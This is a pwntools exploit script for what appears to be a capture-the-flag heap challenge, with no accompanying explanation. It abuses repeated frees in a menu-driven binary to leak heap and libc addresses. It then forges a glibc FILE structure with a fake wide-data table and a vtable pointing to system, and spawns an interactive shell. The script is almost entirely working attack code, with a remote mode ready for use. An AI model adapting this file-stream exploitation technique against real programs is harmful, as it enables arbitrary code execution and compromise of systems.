#!/usr/bin/python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x5555555559cb 
        b* 0x555555555402 
    
        c
        ''')
        sleep(1)
def create(size):
    slna("> ",1)
    slna("Enter the size of the choncc:",size)
def view(idx):
    slna("> ",2)
    slna("Enter the choncc number:",idx)

def edit(idx,content):
    slna("> ",3)
    slna("Enter the choncc number:",idx)
    sla("Enter the new content for the choncc:",content)

def delete(idx):
    slna("> ",4)
    slna("Enter the choncc number:",idx)
def open():
    slna("> ",5)
def close():
    slna("> ",6)
def write():
    slna("> ",7)
    sla("[Y/n]",b'Y')

if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])




##STAGE1: Leak libc, binary => leak IO_FILE ptr
create(0x18)
create(0x18)
create(0x18)
create(0x18)

delete(1)
delete(1)
delete(1)
delete(1)



create(0x18)
view(1)
p.recvuntil(b'1: ')
p.recv(16)
leak_heap = u64(p.recv(8))
info("leak heap: "+ hex(leak_heap))
delete(1)
heap_base = leak_heap - 0x360

GDB()
open()
close()
create(0x1d8)
view(1)

p.recvuntil(b'1: ')
for i in range(58):
    p.recv(8)  
leak_libc = u64(p.recv(8))
info("leak libc: " + hex(leak_libc) )
libc.address = leak_libc - 0x1ee228
info("libc base: " + hex(libc.address))
delete(1)

create(0x1c8)

fake_vtable = {
    0x68: libc.sym['system'] 
}
vtable_payload = flat(fake_vtable, filler=b"\x00", length=0x70)
wide_data = {
    0x30: 0,
    0xe0: heap_base + 0x590
}
wide_data_payload = flat(wide_data, filler=b"\x00", length=0xf0)

payload = p64(0)*2
payload += vtable_payload
payload += b'a'*8
payload += wide_data_payload

edit(1,payload)

delete(1)
create(0x1d8)

fs = FileStructure()

fs.flags = b"  sh\x00\x00\x00\x00"

fs._wide_data = heap_base + 0x608

fs.vtable = libc.sym['_IO_wfile_jumps']
fs._lock = heap_base + 0x20
payload = bytes(fs)

edit(1,payload)

write()


p.interactive()

